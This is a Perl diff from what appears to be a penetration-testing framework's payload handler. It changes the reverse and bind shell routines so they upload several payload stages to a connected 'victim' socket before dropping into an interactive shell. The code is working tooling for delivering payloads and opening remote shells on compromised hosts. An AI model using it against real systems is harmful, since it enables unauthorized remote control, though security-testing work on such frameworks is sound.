@@ -243,7 +243,7 @@ sub impurity_reverse
     return(1);    
 }
 
-# Two-stage reverse connect shells
+# Multistage reverse connect payloads that result in a shell
 sub reverse_shell_staged
 {
     my ($self, $exploit) = @_;
@@ -251,12 +251,17 @@ sub reverse_shell_staged
     my $victim = $self->Listener($exploit,$port);
     return(0) if ! $victim;
     
-    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
-    print STDERR "[*] Uploading second stage...\n\n";
+    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
     
-    my $stage = $self->GetVar('_Payload')->NextStage();
-    $victim->send($stage);
-    
+    my $stagecnt = 2;
+    while (my $stage = $self->GetVar('_Payload')->NextStage())
+    {
+        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
+        $victim->send($stage);
+        $stagecnt++;
+    }
+    print STDERR "[*] All stages sent, dropping to shell...\n\n";
+        
     my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
     
     my $console = $self->ConsoleStart();
@@ -271,7 +276,7 @@ sub reverse_shell_staged
 }
 
 
-# Two-stage bind shells
+# Multistage bind payloads that result in a shell
 sub bind_shell_staged
 {
      my ($self, $exploit) = @_;
@@ -280,11 +285,16 @@ sub bind_shell_staged
     my $victim = $self->Connector($exploit, $host, $port);    
     return if ! $victim;
 
-    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
-    print STDERR "[*] Uploading second stage...\n\n";
+    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "\n";
     
-    my $stage = $self->GetVar('_Payload')->NextStage();
-    $victim->send($stage);
+    my $stagecnt = 2;
+    while (my $stage = $self->GetVar('_Payload')->NextStage())
+    {
+        print STDERR "[*] Uploading stage $stagecnt (".length($stage)." bytes)\n";
+        $victim->send($stage);
+        $stagecnt++;
+    }
+    print STDERR "[*] All stages sent, dropping to shell...\n\n";
 
     my $console = $self->ConsoleStart();
     my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
